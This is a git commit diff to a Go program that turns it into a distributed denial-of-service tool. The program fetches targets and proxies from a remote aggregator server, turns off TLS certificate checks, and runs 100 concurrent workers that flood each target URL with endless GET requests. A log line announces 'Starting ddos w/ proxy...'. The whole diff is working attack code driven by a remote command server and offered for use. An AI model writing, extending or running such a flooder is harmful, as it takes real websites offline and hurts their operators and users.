19addce687cf28797d86575d19a990df639e7402
Volodymyr <volodia23byk@gmail.com>
2022-02-26 14:01:07 +0000

    new changes

--- main.go
+++ main.go
@@ -1,17 +1,44 @@
 package main
 
 import (
+	"crypto/tls"
 	"encoding/json"
 	"log"
 	"math/rand"
 	"net/http"
+	"net/url"
+	"runtime"
+	"sync/atomic"
 	"time"
 )
 
+var client *http.Client
+var TotalRequstSent int64 = 0
+var SuccessRequestSent int64 = 0
+
 const HOST_AGGREGATOR = "http://rockstarbloggers.ru/hosts.json"
+const NUM_OF_WORKERS int = 100
+
+type Proxy []struct {
+	ID   int    `json:"id"`
+	IP   string `json:"ip"`
+	Auth string `json:"auth"`
+}
+
+type HostResp struct {
+	Site struct {
+		ID           int    `json:"id"`
+		URL          string `json:"url"`
+		NeedParseURL int    `json:"need_parse_url"`
+		PageTime     string `json:"page_time"`
+		Attack       int    `json:"atack"`
+	}
+
+	Proxy
+}
 
 func GetHost() (string, error) {
-	resp, err := http.Get(HOST_AGGREGATOR)
+	resp, err := client.Get(HOST_AGGREGATOR)
 	if err != nil {
 		return "", err
 	}
@@ -26,24 +53,8 @@ func GetHost() (string, error) {
 	return hosts[rand.Intn(len(hosts)-1)], nil
 }
 
-type HostResp struct {
-	Site struct {
-		ID           int    `json:"id"`
-		URL          string `json:"url"`
-		NeedParseURL int    `json:"need_parse_url"`
-		PageTime     string `json:"page_time"`
-		Attack       int    `json:"atack"`
-	}
-
-	Proxy []struct {
-		ID   int    `json:"id"`
-		IP   string `json:"ip"`
-		Auth string `json:"auth"`
-	}
-}
-
 func GetDataFromHost(host string) (*HostResp, error) {
-	resp, err := http.Get(host)
+	resp, err := client.Get(host)
 	if err != nil {
 		return nil, err
 	}
@@ -58,14 +69,52 @@ func GetDataFromHost(host string) (*HostResp, error) {
 	return hostResp, err
 }
 
-func main() {
-	rand.Seed(time.Now().UnixNano())
+func SendWithProxy(targetURL string, proxy Proxy) error {
+	return nil
+}
 
-	for {
+func StartHTTPWorkers(done <-chan struct{}, workersNum int, targetURL string) {
+	for i := 0; i < workersNum; i++ {
+		go func() {
+			for {
+				select {
+				case <-done:
+					return
+				default:
+					resp, err := client.Get(targetURL)
+					atomic.AddInt64(&TotalRequstSent, 1)
+					if err == nil {
+						log.Println(resp.StatusCode)
+						atomic.AddInt64(&SuccessRequestSent, 1)
+						resp.Body.Close()
+					}
+				}
+				runtime.Gosched()
+			}
+		}()
+	}
+}
+
+func init() {
+	// Setup
+	rand.Seed(time.Now().UnixNano())
+	tr := http.DefaultTransport.(*http.Transport).Clone()
+	tr.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+	tr.IdleConnTimeout = time.Second * 10
+
+	client = &http.Client{Transport: tr}
+}
+
+func main() {
+	for i := 0; true; i++ {
+		if i != 0 {
+			// Sleep after first failed attempt
+			time.Sleep(time.Second * 5)
+		}
+
 		host, err := GetHost()
 		if err != nil {
 			log.Printf("on getting hosts: %v\n", err)
-			time.Sleep(time.Second * 5)
 			continue
 		}
 		log.Printf("Using the host: %s\n", host)
@@ -74,10 +123,32 @@ func main() {
 
 		if err != nil {
 			log.Printf("on parsing data from host: %v\n", err)
-			time.Sleep(time.Second * 5)
 			continue
 		}
 
-		log.Println(data)
+		// log.Println(data)
+
+		_, err = url.ParseRequestURI(data.Site.URL)
+		if err != nil {
+			log.Printf("on parsing a target URL: %v\n", err)
+			continue
+		}
+
+		resp, err := client.Get(data.Site.URL)
+		if err != nil {
+			log.Printf("on sending to a target URL: %v\n", err)
+			continue
+		}
+		resp.Body.Close()
+
+		if resp.StatusCode != http.StatusOK {
+			log.Println("Starting ddos w/ proxy...")
+			// Send the requst through proxies
+			// err := SendWithProxy(target)
+			continue
+		}
+
+		done := make(chan struct{}, 1)
+		StartHTTPWorkers(done, NUM_OF_WORKERS, data.Site.URL)
 	}
 }
